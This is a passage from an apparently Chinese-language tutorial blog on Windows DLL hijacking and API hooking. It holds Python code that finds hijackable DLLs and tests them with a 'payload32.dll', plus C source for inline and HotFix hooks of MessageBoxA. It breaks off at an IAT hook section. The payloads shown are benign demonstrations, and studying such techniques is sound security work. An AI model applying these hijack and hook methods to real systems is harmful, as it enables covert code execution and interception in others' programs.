<pre class="line-numbers language-c" data-language="c"><code class="language-c">known_dlls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  
import_dlls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  
load_dlls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  
  
  
def <span class="token function">get_known_dlls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>  
    <span class="token string">""</span>"  
    获取系统的KnownDlls列表  
    <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>  
    <span class="token string">""</span><span class="token string">"    access_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"</span>SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"<span class="token punctuation">)</span>  
    try<span class="token operator">:</span>  
       i <span class="token operator">=</span> <span class="token number">0</span>  
       <span class="token keyword">while</span> True<span class="token operator">:</span>  
          dll_name <span class="token operator">=</span> winreg<span class="token punctuation">.</span><span class="token function">EnumValue</span><span class="token punctuation">(</span>access_key<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
          <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">print</span><span class="token expression"><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>  </span></span>
          known_dlls<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>  
          i <span class="token operator">+=</span> <span class="token number">1</span>  
    except Exception as e<span class="token operator">:</span>  
       <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"[+] Read registry finished:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  
    finally<span class="token operator">:</span>  
       winreg<span class="token punctuation">.</span><span class="token function">CloseKey</span><span class="token punctuation">(</span>access_key<span class="token punctuation">)</span>  
  
  
def <span class="token function">get_import_dlls</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token operator">:</span>  
    <span class="token string">""</span>"  
    显示导入表中可能被利用的DLL  
    <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>  
    <span class="token string">""</span>"    pe <span class="token operator">=</span> <span class="token function">PE</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>  
    import_table <span class="token operator">=</span> pe<span class="token punctuation">.</span>DIRECTORY_ENTRY_IMPORT  
    <span class="token keyword">for</span> i in import_table<span class="token operator">:</span>  
       dll_name <span class="token operator">=</span> i<span class="token punctuation">.</span>dll<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
       <span class="token keyword">if</span> dll_name not in known_dlls<span class="token operator">:</span>  
          import_dlls<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>  
  
  
def <span class="token function">get_load_dlls</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token operator">:</span>  
    <span class="token string">""</span>"  
    显示载入时加载的DLL  
    <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>  
    <span class="token string">""</span>"    try<span class="token operator">:</span>  
       proc <span class="token operator">=</span> psutil<span class="token punctuation">.</span><span class="token function">Process</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span>  
       <span class="token keyword">for</span> mem in proc<span class="token punctuation">.</span><span class="token function">memory_maps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>  
          <span class="token keyword">if</span> <span class="token punctuation">(</span>mem<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token char">'.dll'</span><span class="token punctuation">)</span> or mem<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token char">'.drv'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> and <span class="token char">'WinSxS'</span> not in mem<span class="token punctuation">.</span>path<span class="token operator">:</span>  
             begin <span class="token operator">=</span> mem<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">rfind</span><span class="token punctuation">(</span><span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  
             dll_name <span class="token operator">=</span> mem<span class="token punctuation">.</span>path<span class="token punctuation">[</span>begin<span class="token operator">:</span><span class="token punctuation">]</span>  
             <span class="token keyword">if</span> dll_name not in known_dlls and dll_name not in load_dlls<span class="token operator">:</span>  
                load_dlls<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>  
    except Exception as e<span class="token operator">:</span>  
       <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"[!] "</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-2-劫持测试"><a href="#3-2-劫持测试" class="headerlink" title="3.2 劫持测试"></a>3.2 劫持测试</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">def <span class="token function">test_hijack</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> dlls<span class="token punctuation">)</span><span class="token operator">:</span>  
    <span class="token string">""</span>"  
    使用恶意DLL进行劫持测试  
    <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>  
    <span class="token string">""</span>"    <span class="token keyword">for</span> dll in dlls<span class="token operator">:</span>  
       os<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token char">'./files/payload32.dll'</span><span class="token punctuation">,</span> <span class="token char">'./files/'</span><span class="token operator">+</span>dll<span class="token punctuation">)</span>  
       proc <span class="token operator">=</span> psutil<span class="token punctuation">.</span><span class="token function">Popen</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
       time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>  
       <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token char">'./temp_4396'</span><span class="token punctuation">)</span><span class="token operator">:</span>  
          <span class="token function">print</span><span class="token punctuation">(</span>f<span class="token string">"[+] &#123;dll&#125; for &#123;filename&#125; can be hijacked!"</span><span class="token punctuation">)</span>  
          os<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token char">'./temp_4396'</span><span class="token punctuation">)</span>  
       try<span class="token operator">:</span>  
          proc<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
       except psutil<span class="token punctuation">.</span>NoSuchProcess<span class="token operator">:</span>  
          <span class="token function">print</span><span class="token punctuation">(</span>f<span class="token string">"[*] &#123;dll&#125; for &#123;filename&#125; may be hijacked!"</span><span class="token punctuation">)</span>  
       finally<span class="token operator">:</span>  
          os<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token char">'./files/'</span><span class="token operator">+</span>dll<span class="token punctuation">,</span> <span class="token char">'./files/payload32.dll'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对Windows XP下的notepad.exe进行测试的结果如下：<br><img src="/images/1-1.png" alt="1-1"></p>
<h2 id="4-API-Hook"><a href="#4-API-Hook" class="headerlink" title="4 API Hook"></a>4 API Hook</h2><p>网上对于Hook的分类有很多，上面在DLL注入中已经介绍了消息Hook，所以在这里就只介绍Ring3中的API Hook，即对系统DLL中的API函数进行挂钩。网上也有称之为Inject Hook的，但是我感觉还是API Hook最合适。<br>访问其他进程的最简单方式就是DLL，所以Hook通常也是通过DLL注入实现的。我们在DLL中设置好Hook函数，在DLL加载时就进行挂钩，DLL卸载时进行脱钩就可以实现完整的Hook过程。<br>此部分的代码很多都参考了selph师傅的博客，只实现了32位程序的Hook。</p>
<h3 id="4-1-Inline-Hook"><a href="#4-1-Inline-Hook" class="headerlink" title="4.1 Inline Hook"></a>4.1 Inline Hook</h3><p>修改API函数地址的开头的机器码为JMP跳转指令，如果还需要使用原有的API函数，则需要先Unhook，调用完后再重新Hook。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>


BYTE originOpcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>


BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  fdwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token keyword">switch</span> <span class="token punctuation">(</span>fdwReason<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
  <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"InstallHook!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
 <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
  <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 BYTE hookOpcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span class="token comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 1. 获取API函数地址</span>
 PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 2. 修改内存属性</span>
 DWORD originFlags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originFlags<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 3. 读取原机器码，保存</span>
 <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 4. 构造跳转机器码，写入</span>
 DWORD jmpAddr <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hookAddr <span class="token operator">-</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>procAddr <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hookOpcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>jmpAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> hookOpcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 5. 恢复内存属性</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> originFlags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 1. 获取API函数地址</span>
 PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 2. 修改内存属性</span>
 DWORD origin_flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>origin_flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 3. 将原来的机器码写入</span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 4. 恢复内存属性</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> origin_flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Hooked!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="HotFix"><a href="#HotFix" class="headerlink" title="HotFix"></a>HotFix</h4><p>如果想要Hook的API函数的地址前有至少5字节空闲区域可以被利用，则可以在其地址前的5个字节构造JMP指令，在函数地址处构造机器码0xEB, 0xF9跳转到-7字节，即函数前5字节JMP指令，那么正常的API调用就会跳转到JMP指令上。如果我们需要使用原有的API函数，只需要调用函数地址+2就可以了。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>


BYTE originOpcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>


BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  fdwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token keyword">switch</span> <span class="token punctuation">(</span>fdwReason<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
  <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"InstallHook!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
 <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
  <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 BYTE hookOpcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xF9</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 1. 获取API函数地址, 计算Hook的起始地址</span>
 PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 PBYTE beginAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>procAddr <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>
 <span class="token comment">// 2. 读取原来的机器码</span>
 DWORD originFlags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originFlags<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 DWORD jmpAddr <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hookAddr <span class="token operator">-</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>procAddr<span class="token punctuation">;</span> <span class="token comment">// 此处加5减5正好抵消了</span>
 <span class="token comment">// 3. 构造跳转机器码，写入</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hookOpcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>jmpAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> hookOpcode<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> originFlags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 PBYTE beginAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>procAddr <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>
 DWORD originFlags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originFlags<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> originFlags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> MessageBoxA_t<span class="token punctuation">)</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>
 PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 PBYTE endAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>procAddr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
 MessageBoxA_t HookMessageBoxA <span class="token operator">=</span> <span class="token punctuation">(</span>MessageBoxA_t<span class="token punctuation">)</span>endAddr<span class="token punctuation">;</span>
 <span class="token function">HookMessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Hooked!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="4-2-IAT-Hook"><a href="#4-2-IAT-Hook" class="headerlink" title="4.2 IAT Hook"></a>4.2 IAT Hook</h3><p>此方法是修改加载到内存中的PE结构中的IAT表，此时IAT表存储的已经是函数的地址了，我们只需要遍历IAT，找到要Hook的DLL中对应的API函数地址然后进行修改即可。此时并不会修改DLL中的IAT，所以原有的API函数依然可以正常使用。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span></span>
